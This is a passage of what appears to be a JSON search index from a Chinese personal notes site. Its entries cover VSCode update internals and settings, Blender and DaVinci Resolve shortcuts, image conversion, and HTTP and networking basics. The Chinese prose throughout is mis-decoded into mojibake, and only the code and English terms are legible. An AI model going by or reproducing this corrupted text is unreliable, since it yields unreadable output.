UpdateResultCode); end; end; CreateMutex('{#AppMutex}-ready') åˆ›å»ºçš„äº’æ–¥ä¿¡å·é‡ ç”¨äºå‘ŠçŸ¥vscodeå·²ç»ä¸´æ—¶å®‰è£…ç»“æŸ const readyMutexName = `${this.productService.win32MutexName}-ready`; const mutex = await import('windows-mutex'); // poll for mutex-ready pollUntil(() => mutex.isActive(readyMutexName)) .then(() => this.setState(State.Ready(update))); pollUntil(() => mutex.isActive(readyMutexName)) è¡¨ç¤ºè½®è¯¢æ£€æŸ¥ {#AppMutex}-ready æ˜¯å¦å·²ç»å­˜åœ¨, å­˜åœ¨å°±è¡¨ç¤ºå·²ç»ä¸´æ—¶å®‰è£…åˆ° _ å®Œæˆ. macosæ— æ„Ÿæ›´æ–° ä½¿ç”¨äº† electron ä¸‹çš„ autoUpdater æ¨¡å—. å®˜ç½‘è¯´æ˜: autoUpdater åº”ç”¨å…¶ä¸­éƒ¨åˆ†: autoUpdater å¯¹è±¡å…·æœ‰ä»¥ä¸‹æ–¹æ³• æ³¨è§£ ä¸€äº›å½“æ—¶æœåˆ°ä½†æ˜¯æ²¡æ—¶é—´çœ‹çš„æ–‡: ç ”ç©¶Electronè‡ªåŠ¨æ›´æ–° Electron AutoUpdaterè‡ªåŠ¨æ›´æ–°é—®é¢˜ linux ä¸æ”¯æŒ, æ£€æŸ¥æ›´æ–°åæ˜¯è·³è½¬åˆ°æµè§ˆå™¨ä¸‹è½½çš„ çŒœæµ‹ä¸æƒ³æ³• åå°æ›´æ–°çš„åŠŸèƒ½, windows ä¸“é—¨è‡ªå®šä¹‰äº†å·¥å…· mac ä½¿ç”¨ electron çš„è‡ªåŠ¨æ›´æ–°æ¨¡å— linux æ‰‹åŠ¨ä¸‹è½½ è‡³äºä¸ºä»€ä¹ˆä¸å…¨å¹³å°æ”¯æŒå‘¢, çŒœæµ‹å¯èƒ½æœ‰ä»¥ä¸‹åŸå› : linuxæƒé™æ§åˆ¶é—®é¢˜ æ‰€ä»¥æ²¡æœ‰åƒä½¿ç”¨å‹ç¼©åŒ…è§£å‹å¤åˆ¶çš„æ–¹å¼. å¦å¤–ä½¿ç”¨linuxçš„ç¾¤ä½“, å¤§å¤šéƒ½æ˜¯åŒè¡Œå§, è®©ä»–/å¥¹ä»¬è‡ªå·±ç©å‘— electron è™½ç„¶æ”¯æŒäº†windowsä¸mac, ä½†æ˜¯ä¼°è®¡æœ‰å¦å¤–çš„éœ€æ±‚, æˆ–è€…æ˜¯åé¢æ‰æ”¯æŒçš„(ä¸æƒ³å»çœ‹æäº¤å†å², åé¢æœ‰ç©ºè¡¥å……) (electron çš„è‡ªåŠ¨æ›´æ–°, å…·ä½“æ€ä¹ˆå®ç°çš„æˆ‘æ²¡æœ‰å»çœ‹æºç , ä¸åšå¤ªå¤šè®¨è®º) æ˜¯ä¸æ˜¯å¯ä»¥å…¨å¹³å°æ”¯æŒ? ä½¿ç”¨ä¸‹è½½å‹ç¼©åŒ…çš„å½¢å¼, è§£å‹çš„ä¸´æ—¶ç›®å½•ç„¶åç§»åŠ¨. windowså·²ç»æœ‰exeçš„æ”¯æŒäº†, ä¸‹è½½å‹ç¼©åŒ…è¿˜éœ€è¦å¦å¤–å†™å·¥å…·, å¾—ä¸å¿å¤±. ä¹Ÿå¯èƒ½å°±æ˜¯ä¸æƒ³æ”¯æŒå§ æœ€å, windowså°±æ˜¯å¾®è½¯è‡ªå®¶äº§å“, è‡ªå®¶äº§å“å½“ç„¶è¦ç”¨è‡ªå·±çš„","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vSCode-background-update-inquiry.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vSCode-background-update-inquiry.html"},{"title":"vscode","text":"å¸¸ç”¨å¿«æ·é”®: ctrl + p #æŒ‰æ–‡ä»¶åæœç´¢ ctrl + shift + f #å…¨å±€æœç´¢æŒ‡å®šæ–‡ä»¶å¤¹å†…å®¹ ctrl + f #å…¨å±€æœç´¢å½“å‰æ‰“å¼€æ–‡ä»¶å†…å®¹ ctrl + shift + p #å…¨å±€æ‰“å¼€æ–‡ä»¶ å…³äºsetting.json: { // Git å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ \"git.path\": \"D:/Program Files/Git/bin/git.exe\" ,\"editor.tabSize\": 4 ,\"editor.insertSpaces\": false ,\"editor.useTabStops\": true // é»˜è®¤è¡Œå°¾å­—ç¬¦ã€‚ä½¿ç”¨ \\n è¡¨ç¤º LFï¼Œ\\r\\n è¡¨ç¤º CRLFã€‚ ,\"files.eol\": \"\\n\" // æ§åˆ¶ç¼–è¾‘å™¨åœ¨ç©ºç™½å­—ç¬¦ä¸Šæ˜¾ç¤ºç‰¹æ®Šç¬¦å·çš„æ–¹å¼ã€‚å¯é€‰å€¼ä¸º \"none\"(æ— )ã€\"boundary\"(è¾¹ç•Œ) æˆ– \"all\"(æ‰€æœ‰)ã€‚é€‰æ‹© \"boundary\" é€‰é¡¹ï¼Œåˆ™ä¸ä¼šåœ¨å•è¯ä¹‹é—´çš„å•ä¸ªç©ºæ ¼ä¸Šæ˜¾ç¤ºç‰¹æ®Šç¬¦å·ã€‚ ,\"editor.renderWhitespace\": \"all\" // å»é™¤shellcheck localçš„æŠ¥é”™ In POSIX sh, 'local' is undefined // local is supported in many shells, including bash, ksh, dash, and BusyBox ash. However, strictly speaking, it's not POSIX. ,\"shellcheck.exclude\": [\"SC3043\"] } vscodeæ’ä»¶ç¦»çº¿å®‰è£… ç¦»çº¿å®‰è£… åœ¨ vscodeæ’ä»¶åº“ æœç´¢è‡ªå·±éœ€è¦çš„æ’ä»¶ï¼Œç‚¹å‡»å³ä¾§ Download Extension ç„¶åå°†ä¸‹è½½çš„æ–‡ä»¶ï¼Œå¤åˆ¶åˆ°vscodeå®‰è£…ç›®å½•ä¸‹çš„binæ–‡ä»¶å¤¹ä¸­ åœ¨binæ–‡ä»¶å¤¹ä¸‹æ‰“å¼€cmdï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤: code --install-extension octref.vuter-0.23.0.vsix #éœ€è¦å®‰è£…çš„æ’ä»¶æ–‡ä»¶å æ³¨è§£ vscodeä¸­å¯ç›´æ¥ä»visxå®‰è£…æ’ä»¶ åŸæ–‡é“¾æ¥: https://blog.csdn.net/qq_26118603/article/details/115062440","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vscode.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vscode.html"},{"title":"vscode-æœ¬åœ°å†å²è®°å½•","text":"vscodeç¼–è¾‘å™¨å†…ç½®äº†æœ¬åœ°æ–‡ä»¶å†å²è®°å½•çš„æ”¯æŒ, å¯ä»¥é€šè¿‡é…ç½®setting.jsonè‡ªå®šä¹‰, é»˜è®¤çš„é…ç½®å¦‚ä¸‹: // æ§åˆ¶æ˜¯å¦å¯ç”¨æœ¬åœ°æ–‡ä»¶å†å²è®°å½•ã€‚å¯ç”¨åï¼Œæ‰€ä¿å­˜ç¼–è¾‘å™¨æ–‡ä»¶å†…å®¹å°†å­˜å‚¨åˆ°å¤‡ä»½ä½ç½®ï¼Œä»¥ä¾¿ç¨åå¯ä»¥è¿˜åŸæˆ–æŸ¥çœ‹å†…å®¹ã€‚æ›´æ”¹æ­¤è®¾ç½®ä¸ä¼šå½±å“ç°æœ‰æœ¬åœ°æ–‡ä»¶å†å²è®°å½•æ¡ç›®ã€‚ \"workbench.localHistory.enabled\": true, // é…ç½®è·¯å¾„æˆ– [glob æ¨¡å¼](https://aka.ms/vscode-glob-patterns)ä»¥æ’é™¤æœ¬åœ°æ–‡ä»¶å†å²è®°å½•ä¸­çš„æ–‡ä»¶ã€‚glob æ¨¡å¼çš„è®¡ç®—ç»“æœå§‹ç»ˆæ˜¯ç›¸å¯¹äºå·¥ä½œåŒºæ–‡ä»¶å¤¹è·¯å¾„æ‰€åœ¨çš„ä½ç½®ï¼Œé™¤éå®ƒä»¬æ˜¯ç»å¯¹è·¯å¾„ã€‚æ›´æ”¹æ­¤è®¾ç½®ä¸ä¼šå½±å“ç°æœ‰çš„æœ¬åœ°æ–‡ä»¶å†å²è®°å½•æ¡ç›®ã€‚ \"workbench.localHistory.exclude\": {}, // æ§åˆ¶æ¯ä¸ªæ–‡ä»¶çš„æœ€å¤§æœ¬åœ°æ–‡ä»¶å†å²è®°å½•æ¡ç›®æ•°ã€‚å½“æ–‡ä»¶çš„æœ¬åœ°æ–‡ä»¶å†å²è®°å½•æ¡ç›®æ•°è¶…è¿‡æ­¤æ•°ç›®æ—¶ï¼Œå°†ä¸¢å¼ƒæœ€æ—©çš„æ¡ç›®ã€‚ \"workbench.localHistory.maxFileEntries\": 50, // æ§åˆ¶è€ƒè™‘ç”¨äºæœ¬åœ°å†å²è®°å½•çš„æ–‡ä»¶æœ€å¤§å¤§å°(KB)ã€‚è¾ƒå¤§çš„æ–‡ä»¶å°†ä¸ä¼šæ·»åŠ åˆ°æœ¬åœ°å†å²è®°å½•ä¸­ã€‚æ›´æ”¹æ­¤è®¾ç½®ä¸ä¼šå½±å“ç°æœ‰æœ¬åœ°æ–‡ä»¶å†å²è®°å½•æ¡ç›®ã€‚ \"workbench.localHistory.maxFileSize\": 256, // é…ç½®æ—¶é—´é—´éš”(ä»¥ç§’ä¸ºå•ä½)ï¼Œåœ¨æ­¤é—´éš”æœŸé—´ï¼Œæœ¬åœ°æ–‡ä»¶å†å²è®°å½•ä¸­çš„æœ€åä¸€ä¸ªæ¡ç›®å°†æ›¿æ¢ä¸ºæ­£åœ¨æ·»åŠ çš„æ¡ç›®ã€‚è¿™æœ‰åŠ©äºå‡å°‘æ‰€æ·»åŠ çš„æ¡ç›®æ€»æ•°ï¼Œä¾‹å¦‚å¯ç”¨è‡ªåŠ¨ä¿å­˜æ—¶ã€‚æ­¤è®¾ç½®ä»…åº”ç”¨äºå…·æœ‰ç›¸åŒæºçš„æ¡ç›®ã€‚æ›´æ”¹æ­¤è®¾ç½®ä¸ä¼šå½±å“ç°æœ‰æœ¬åœ°æ–‡ä»¶å†å²è®°å½•æ¡ç›®ã€‚ \"workbench.localHistory.mergeWindow\": 10, æºç ç›¸å…³ å†å²æ–‡ä»¶æ˜¯å…¨æ‹·è´åˆ°ä¸€ä¸ªä¸´æ—¶ä½ç½®, ä¸´æ—¶ä½ç½®è·Ÿæ®ç”¨æˆ·æœºå™¨, ä¸€èˆ¬Windowsé»˜è®¤æ˜¯ $APPDATA/Roaming/Code/User/History ä¸‹é¢çš„æ¯ä¸€ä¸ªæ–‡ä»¶å¤¹éƒ½æ˜¯16è¿›åˆ¶çš„ æºæ–‡ä»¶å…¨è·¯å¾„çš„hashå€¼(å³æ¯ä¸€ä¸ªæ–‡ä»¶å¤¹å¯¹åº”ä¸€ä¸ªå®é™…çš„æ–‡ä»¶), ä¸‹é¢çš„æ¯ä¸ªæ¡ç›®è¡¨ç¤ºæ¯ä¸€æ¬¡çš„è®°å½•å…¨æ‹·è´, å‘½åä¸º: å››ä½éšæœºæ•°+åç¼€ å¯¹åº”å…³ç³»åœ¨æ¡ç›®æ–‡ä»¶å¤¹çš„ entries.json å†…. æœåŠ¡æºç ä½ç½®: src/vs/workbench/services/workingCopy/common/workingCopyHistoryService.ts","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vscode-local-historical-record.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vscode-local-historical-record.html"},{"title":"å»ºæ¨¡-Blender","text":"Blender æ˜¯ä¸€ä¸ªå¼€æºå…è´¹çš„è½¯ä»¶ï¼Œ æ”¯æŒä¸­æ–‡ å¿«æ·é”®-Win åŠŸèƒ½ å¿«æ·é”® åœºæ™¯ä½ç§» Shift + é¼ æ ‡ä¸­é”® åœºæ™¯æ—‹è½¬ é•¿æŒ‰é¼ æ ‡ä¸­é”® åœºæ™¯ç¼©æ”¾ æ»šåŠ¨é¼ æ ‡ä¸­é”® ç‰©ä½“ä½ç§» G (åœ¨æ­¤åŸºç¡€ä¸Šç‚¹å‡»XYZï¼Œä¼šæ²¿ç€å¯¹åº”çš„è½´çº¿è¿›è¡Œç¼–è¾‘ï¼› æˆ–è€…å« ç‰©ä½“ä½ç§») ç‰©ä½“æ—‹è½¬ R (åœ¨æ­¤åŸºç¡€ä¸Šç‚¹å‡»XYZï¼Œä¼šæ²¿ç€å¯¹åº”çš„è½´çº¿è¿›è¡Œç¼–è¾‘) ç‰©ä½“ç¼©æ”¾ S (åœ¨æ­¤åŸºç¡€ä¸Šç‚¹å‡»XYZï¼Œä¼šæ²¿ç€å¯¹åº”çš„è½´çº¿è¿›è¡Œç¼–è¾‘) æ­£è§†å›¾ 1 (å°é”®ç›˜æ•°å­—ï¼Œå¯ä»¥é€šè¿‡ ç¼–è¾‘->åå¥½è®¾ç½®->è¾“å…¥->æ¨¡æ‹Ÿæ•°å­—é”®ç›˜ å¼€å¯ä¸Šæ–¹æ•°å­—é”®ç›˜çš„æ”¯æŒï¼Œ é’ˆå¯¹æ²¡æœ‰å°æ•°å­—é”®ç›˜çš„æƒ…å†µ) ä¾§è§†å›¾ 3 (å°é”®ç›˜æ•°å­—) é€è§†å›¾ 5 (å°é”®ç›˜æ•°å­—) é¡¶è§†å›¾ 7 (å°é”®ç›˜æ•°å­—) ç‰©ä½“æœ€å¤§åŒ– .(å°æ•°å­—é”®ç›˜ï¼Œ éœ€å…ˆé€‰ä¸­ç‰©ä½“) ç‹¬æ˜¾ / (å³å•ç‹¬æ˜¾ç¤ºæŸä¸€ä¸ªç‰©ä½“ï¼Œ éœ€å…ˆé€‰ä¸­ç‰©ä½“) é€æ˜¾ Alt + Z (ä¸»è¦ç”¨äºç¼–è¾‘æ—¶é€‰æ‹©å¯¹è±¡æ•´ä½“ï¼Œ å¦åˆ™åªèƒ½é€‰æ‹©çœ‹åˆ°çš„è¿™ä¸€é¢) æ·»åŠ  Shift + A æ¨¡å¼é€‰æ‹© Ctrl + Tab(éœ€å…ˆé€‰ä¸­)ï¼Œ æ¯”å¦‚ç¼–è¾‘æ¨¡å¼ å€’è§’ Ctrl + B (ä¸ºå‡ ä½•å›¾å½¢åˆ›å»ºå€’è§’æˆ–åœ†è§’ã€‚ å€’è§’å°±æ˜¯ç”¨æ¥å¹³æ»‘è¾¹çº¿æˆ–è€…æ‹è§’çš„) å¾ªç¯åˆ‡å‰² Ctrl + R æ’å…¥ I æŒ¤å‹ E å°é—­ F (ä¸€èˆ¬ç”¨äºé€‰ä¸­è¾¹åå°è¾¹) æ²¿æ³•å‘æŒ¤å‡ºé¢ Alt + E å¯¹è±¡å¤åˆ¶ Shift + G å…¨éƒ¨è§†å›¾åŒå±æ˜¾ç¤º Ctrl + Alt + Q (æˆ–è€…ç›´æ¥åœ¨å·¦ä¸Šè§’æ‹–æ‹½ï¼Œå†æˆ–è€…ç‚¹å‡» æ–°å»ºçª—å£) å…³è”æè´¨ Ctrl + L å…¶ä»–è¯´æ˜: é»˜è®¤æ¨¡å¼ä¸‹ï¼Œ å½“å¼€å¯ å¯¹è±¡ç¼–è¾‘ æ—¶ï¼Œ 1/2/3 çš„æ•ˆæœå°±æ˜¯ ç‚¹/çº¿/é¢ çš„åˆ‡æ¢ å½“åœ¨ç¼–è¾‘æ¨¡å¼é€‰æ‹© çº¿ æ—¶å€™ï¼Œ Alt + å•å‡» å¯ä»¥é€‰æ‹©ç‚¹å‡»é¢çš„çº¿æ¡ æ‘„åƒæœºè§†å›¾ æ‘„åƒæœºè§†å›¾æ˜¾ç¤ºå½“å‰çš„åœºæ™¯ï¼Œæ‘„åƒæœºè§†å›¾å¯ä»¥ç”¨æ¥æ‹æ‘„ç…§ç‰‡ï¼Œå¹¶é¢„è§ˆæ‹æ‘„æ—¶åœºæ™¯çš„æ ·å­ï¼ æ¸²æŸ“çš„å›¾åƒå°†åŒ…å«è™šçº¿å†…çš„æ‰€æœ‰å†…å®¹ã€‚åœ¨è¿™ä¸ªè§†å›¾ä¸­ï¼Œæ‚¨è¿˜å¯ä»¥è®¾ç½®å‘ˆç°æ¸²æŸ“åŒºåŸŸå®ƒå®šå‘ˆçš„3Dè§†å›¾çš„éƒ¨åˆ† Shift + A æ–°å»ºæ—¶å€™å¯é€‰æ‹© æ‘„åƒæœº N å¯ä»¥é”å®šæ‘„åƒæœº(æˆ–è€…åœ¨å³ä¸Šè§’è¿›è¡Œå±æ€§è®¾ç½®) æ”¾ç½®å¥½æ‘„åƒæœºä½ç½®åï¼Œ å¯ä»¥æŒ‰å°é”®ç›˜ 0 è¿›å…¥æ‘„åƒæœºè§†è§’ å¯åœ¨å³ä¸Šè§’è®¾ç½®ä¸€äº›ç›¸å…³å±æ€§ ç€è‰²å™¨ å·¦ä¸Šè§’ä¸‹æ‹‰é€‰æ‹© ç€è‰²å™¨ç¼–è¾‘å™¨ æ¸²æŸ“å¼•æ“ cyclesæ˜¯Blenderä¸­è‘—åçš„æ¸²æŸ“å¼•æ“ï¼Œå¼€æºå…è´¹ã€‚ cyclesæ¸²æŸ“å™¨æ˜¯åŸºäºç‰©ç†ç®—æ³•çš„ç”µå½±çº§åˆ«æ¸²æŸ“å™¨ï¼Œæ­£åœ¨è¢«è¶Šæ¥è¶Šå¤šçš„å¥½è±åç”µå½±å…¬å¸ä»¥åŠå·¥ä½œæ˜¯ä½œä¸ºé¦–å¸­æ¸²æŸ“å™¨ä½¿ç”¨ è¡¨é¢ç»†åˆ†ä¿®æ”¹å™¨ è¡¨é¢ç»†åˆ†ä¿®æ”¹å™¨ç”¨äºå°†ç½‘æ ¼çš„é¢åˆ†å‰²æˆæ›´å°çš„é¢, ä½¿å…¶çœ‹èµ·æ¥æ›´å¹³æ»‘ã€‚å®ƒä½¿æ‚¨èƒ½å¤Ÿé€šè¿‡ç®€å•å»ºæ¨¡å’Œä½é¡¶ç‚¹ç½‘æ ¼åˆ›å»ºå¤æ‚çš„å…‰æ»‘è¡¨é¢ã€‚ æè´¨é¢„è§ˆ å³ä¸Šè§’çƒå½¢å›¾æ ‡ä½ç½®","tags":"å‰ªè¾‘","url":"/yq-doc-source-docs-Chaotic-Editing-Modeling-Blener.html","loc":"/yq-doc-source-docs-Chaotic-Editing-Modeling-Blener.html"},{"title":"å›¾ç‰‡æ ¼å¼è½¬æ¢","text":"æ–¹æ¡ˆä¸€: ä½¿ç”¨ convert å‘½ä»¤ ä½¿ç”¨ convert å‘½ä»¤, macéœ€è¦å®‰è£…imagemagick (å†…ç½®äºæ­¤åŒ…å‘½ä»¤): brew install imagemagick ç¼ºç‚¹: è´¨é‡ä¸é«˜ æ–¹æ¡ˆäºŒ: sips macè‡ªå¸¦, è´¨é‡è¾ƒé«˜ ä¸è¿‡ä¸æ”¯æŒè½¬æ¢ä¸º svg ... å‚è€ƒ:: https://blog.csdn.net/qq_41437512/article/details/122619375","tags":"å‰ªè¾‘","url":"/yq-doc-source-docs-Chaotic-Editing-Photo-format-conversion.html","loc":"/yq-doc-source-docs-Chaotic-Editing-Photo-format-conversion.html"},{"title":"åŸºç¡€çŸ¥è¯†","text":"é¢œè‰²ä¸‰è¦ç´  è‰²ç›¸ é¥±å’Œåº¦ äº®åº¦ ç´ æåˆ†ç±» REC709 å¸¸è§„ç´ æ RAW åŸå§‹ç´ æ LOG ç°ç‰‡ç´ æ(logå‡½æ•°è½¬æ¢ä¿¡æ¯) è®¾è®¡... Aå·æ–‡ä»¶: ä¸»ä½“ç´ æ, å¦‚è®¿è°ˆæ—¶çš„ä¸»äººå…¬è®¿è°ˆç´ æ Bå·æ–‡ä»¶: ç›¸å…³ä¸»é¢˜ç´ æ, å¦‚è®¿è°ˆæ—¶ä¸»äººå…¬ç›¸å…³ä»‹ç»ç­‰","tags":"å‰ªè¾‘","url":"/yq-doc-source-docs-Chaotic-Editing-Some-knowledge.html","loc":"/yq-doc-source-docs-Chaotic-Editing-Some-knowledge.html"},{"title":"è¾¾èŠ¬å¥‡","text":"ç³»ç»Ÿ: MAC å¿«æ·æ“ä½œ Command + P: å³é”®è§†é¢‘è®¾ç½®æ ‡å¿—å¸§: å¯ä»¥ç†è§£ä¸ºè®¾ç½®å›¾ç‰‡å°é¢ I: æ ‡è®°å…¥ç‚¹ O: æ ‡è®°å‡ºç‚¹, è·Ÿä¸Šä¸€ä¸ªé…åˆå¯ä»¥æˆªå–è§†é¢‘ç‰‡æ®µ Comand + +: CommandåŠ åŠ å·, æ”¾å¤§æ—¶é—´çº¿ Comand + -: CommandåŠ å‡å·, ç¼©å°æ—¶é—´çº¿, ä¸ä¸Šä¸€ä¸ªå¯è§äº æ—¶é—´çº¿ç¼©æ”¾ Shift + Z: å¯¹å½“å‰æ—¶é—´çº¿è¿›è¡Œé€‚é…æ“ä½œ(å°½é‡èƒ½çœ‹åˆ°æ›´å¤šæ—¶é—´çº¿) F9: æ’å…¥è§†é¢‘ç‰‡æ®µ F10: è¦†ç›–è§†é¢‘ç‰‡æ®µ F11: æ›¿æ¢è§†é¢‘ç‰‡æ®µ, ä¸ä¸Šä¸¤ä¸ªæ³¨æ„ æ’å…¥/è¦†ç›–/æ›¿æ¢æ“ä½œæ—¶æ³¨æ„ A: é€‰æ‹©æ¨¡å¼, å¯ä»¥æ‹–åŠ¨æ—¶é—´çº¿çš„è§†é¢‘, è¿›è¡Œè£å‰ª, ä¼šæ›¿æ¢è£å‡çš„è§†é¢‘å¸§ä¸ºç©ºç™½, éœ€æ‰‹åŠ¨åˆ é™¤æ­¤éƒ¨åˆ†ç©ºç™½ T: ä¿®å‰ªç¼–è¾‘æ¨¡å¼, ä¸Šä¸€ä¸ªçš„æ”¹è¿›, è‡ªåŠ¨åˆ é™¤è¢«è£å‡çš„è§†é¢‘å¸§(æ³¢çº¹ä¿®å‰ª) ps: ä»ç´ ææˆªå–å¥½ç‰‡æ®µåå¯ä»¥ç›´æ¥æ‹–å…¥æ—¶é—´çº¿ æ’­æ”¾å¿«æ·é”®(J, K, L): J: å€’æ”¾, å†æŒ‰ä¸€æ¬¡åŠ é€Ÿ(å¯å¤šæ¬¡åŠ é€Ÿ) K: æš‚åœæ’­æ”¾ L: å¿«é€Ÿæ’­æ”¾, å†æŒ‰ä¸€æ¬¡åŠ é€Ÿ(å¯å¤šæ¬¡åŠ é€Ÿ) K + J: é€å¸§å‘åæ’­æ”¾ K + J(é•¿æŒ‰): å‘å0.5å€é€Ÿæ’­æ”¾ K + L: é€å¸§å‘å‰æ’­æ”¾ K + L(é•¿æŒ‰): å‘å‰0.5å€é€Ÿæ’­æ”¾ ç©ºæ ¼: æš‚åœ/æ’­æ”¾ +: åŠ å·, å‘å‰è·³è½¬æŒ‡å®šæ—¶é—´(å¸§) -: å‡å·, å‘åè·³è½¬æŒ‡å®šæ—¶é—´(å¸§), ä¸ä¸Šä¸€ä¸ªå¯è§ è·³è½¬æŒ‡å®šæ—¶é—´(å¸§) è½¯ä»¶ç›¸å…³æ¦‚å¿µ Masterå·¥ä½œåŒº ä¸»å·¥ä½œåŒº è¾¾èŠ¬å¥‡é»˜è®¤ç»´æŠ¤çš„ä¸€ä¸ªå·¥ä½œåŒº, ç”¨æ¥ç®¡ç†ç´ æåˆ†ç±», å¼€åœ¨æ­¤éƒ¨åˆ†ä¸‹æ–°å»ºæ–‡ä»¶å¤¹ Masterå·¥ä½œåŒº æ—¶é—´çº¿ç¼©æ”¾ å¯ä»¥å°†æ­£åœ¨æ“ä½œçš„æ—¶é—´çº¿æ”¾å¤§ç¼©å°, å…¶å®å°±æ˜¯è§†é¢‘å¸§çš„æ›´è¯¦ç»†/æ›´ç²¾ç®€ æ—¶é—´çº¿ç¼©æ”¾ å‘å‰/åè·³è½¬æŒ‡å®šæ—¶é—´(å¸§) å‰ªè¾‘æ—¶å€™å¯ä»¥åœ¨é€‰å®šçš„åª’ä½“åº“æŒ‡å®šå‘å‰/åè·³è½¬æŒ‡å®šæ—¶é—´(å¸§), å¿«æ·é”®ä¸ºåœ¨åª’ä½“æ—¶, å•å‡» +/- (å•å‡»åŠ å·æˆ–è€…å‡å·), åŠ å·å‘å‰, å‡å·å‘å å‡ºç°çš„æ¡†ä¸­è¾“å…¥æ ¼å¼:: æ—¶:åˆ†:ç§’:å¸§ å‘å‰/åè·³è½¬æŒ‡å®šæ—¶é—´(å¸§) J-Cat æœ‰äº›è§†é¢‘, å…ˆå¬åˆ°äººç‰©è¯´è¯çš„å£°éŸ³, å†çœ‹åˆ°äºº. å®é™…åº”ç”¨ç›¸å½“äºä¸ºä¸€ä¸ªåœºæ™¯é…éŸ³. æ’å…¥/è¦†ç›–/æ›¿æ¢æ“ä½œæ—¶æ³¨æ„ å½“æ’å…¥/è¦†ç›–/æ›¿æ¢æ“ä½œ(F9/F10/F11)æ—¶, æ³¨æ„éŸ³é¢‘æ˜¯å¦éœ€è¦è¦†ç›– æ­¤å¤„æ˜¯å¦é€‰ä¸­å†³å®šæ˜¯å¦å¯¹éŸ³é¢‘è¿›è¡Œæ“ä½œ","tags":"å‰ªè¾‘","url":"/yq-doc-source-docs-Chaotic-Editing-da-Vinci.html","loc":"/yq-doc-source-docs-Chaotic-Editing-da-Vinci.html"},{"title":"å‰ªè¾‘","text":"å»ºæ¨¡-Blender è¾¾èŠ¬å¥‡ ä¸€äº›çŸ¥è¯† å›¾ç‰‡æ ¼å¼è½¬æ¢","tags":"å‰ªè¾‘","url":"/yq-doc-source-docs-Chaotic-Editing-index.html","loc":"/yq-doc-source-docs-Chaotic-Editing-index.html"},{"title":"HTTPè®¤è¯†","text":"HTTPæ˜¯ä¸€ç§åè®®, è¶…æ–‡æœ¬ä¼ è¾“åè®®, ä¸æä¾›æ•°æ®åŒ…çš„ä¼ è¾“åŠŸèƒ½. æœ¬è´¨ä¸º: å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çº¦å®šå¥½çš„ä¸€ç§é€šä¿¡æ ¼å¼ (å°±åƒç§¦å§‹çš‡çš„è½¦åŒè½¨ä¹¦åŒæ–‡). ä¸RPCåŒºåˆ« å±äºä¸¤ä¸ªç»´åº¦, HTTPæ˜¯é€šä¿¡åè®®, RPCæ˜¯è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨çš„æœ¬åœ°æ–¹æ³•, ç›¸åçš„æ˜¯è‡ªå·±è°ƒç”¨è‡ªå·±æœ¬åœ°æ–¹æ³•). RPCå¯ä»¥åŸºäºHTTPä½¿ç”¨, ä¹Ÿå¯ä»¥åŸºäºå…¶ä»–åè®®(å¦‚TCP)ä½¿ç”¨, ä¸€èˆ¬éƒ½æ˜¯åŸºäºTCP, å› ä¸ºTCPåè®®åœ¨ä¼ è¾“å±‚, æ¯”HTTPçš„åº”ç”¨å±‚æ›´åº•å±‚, ä¼ è¾“æ›´å¿«. RPCæ˜¯é¢å‘è¿‡ç¨‹çš„ï¼Œæœ€ç»ˆçš„ç›®çš„å°±æ˜¯ä¸ºäº†ä¼ è¾“å¯¹è±¡ï¼Œæ‰€ä»¥åªéœ€è¦ç½‘ç»œé€šä¿¡+å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–å°±è¡Œäº† (rpcå…³æ³¨çš„åº”è¯¥æ˜¯ä¼ è¾“åè®®å’Œåºåˆ—åŒ–åè®®) HTTPå†—ä½™åº¦ï¼Œå¤æ‚æ€§ï¼Œæ€§èƒ½éƒ½ä¸å¤ªè¡Œï¼Œè€Œä¸”è¿˜è¦æŒ‡å®šipç«¯å£ï¼Œè¯·æ±‚èµ„æºè·¯å¾„ç­‰ç­‰ è‡³äºä¸ºä»€ä¹ˆä½¿ç”¨å°è£…å¥½çš„RPC, ä¸€æ˜¯å› ä¸ºRPCä¸å±€é™äºä½¿ç”¨HTTPåè®®(HTTPåè®®è¾ƒå†—ä½™) äºŒæ˜¯éƒ½æ˜¯å†…éƒ¨ä½¿ç”¨(å¾ˆå°‘æœ‰ç»™å¤–éƒ¨æä¾›ç›´æ¥è°ƒç”¨æ–¹æ³•çš„), ä¸ç”¨è€ƒè™‘é€šç”¨æ€§(HTTPé€šç”¨æ€§è¾ƒå¥½) æŠ€å·§ ä¸€èˆ¬RPCéƒ½æ˜¯å¯¹å†…, HTTPå¯¹å¤–ä½¿ç”¨","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-Http-know.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-Http-know.html"},{"title":"IPåœ°å€ä¸å­ç½‘åˆ’åˆ†","text":"IPåœ°å€æ˜¯ä¸€ä¸ª 32ä½çš„äºŒè¿›åˆ¶ åœ°å€ï¼Œè¢«åˆ†ä¸º4ä¸ª8ä½æ®µï¼ˆå…«ä½ç»„ï¼‰ã€‚ äººä»¬ä¸ä¹ æƒ¯ä½¿ç”¨32çš„äºŒè¿›åˆ¶åœ°å€æˆ–8ä½çš„äºŒè¿›åˆ¶å…«ä½ç»„ï¼Œ æ‰€ä»¥IPåœ°å€æœ€å¸¸ç”¨çš„è¡¨è¾¾å½¢å¼æ˜¯ ç‚¹åˆ†åè¿›åˆ¶ å½¢å¼ã€‚ IPåœ°å€åˆ†ç±» IPåœ°å€ä¸­ä¸€éƒ¨åˆ†æ˜¯ ç½‘ç»œID ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯ ä¸»æœºID ï¼Œ 